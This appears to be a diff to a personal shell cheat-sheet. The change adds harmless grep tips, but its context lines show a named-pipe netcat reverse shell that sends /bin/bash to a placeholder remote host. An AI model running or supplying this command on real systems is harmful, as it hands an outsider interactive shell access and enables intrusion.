@@ -28,3 +28,23 @@ mknod /tmp/datapipe p
 /bin/bash 0</tmp/datapipe | nc remote.host.com port 1>/tmp/datapipe
 ```
 
+# grep
+- multiple search terms:
+```
+grep -e term1 -e term2 <file>
+```
+
+- exclude term:
+```
+grep -v term <file>
+```
+
+- exclude multiple terms:
+```
+grep -v -e term1 -e term2 <file>
+```
+
+- Print file names and line numbers for matches:
+```
+grep -Hn term
+```
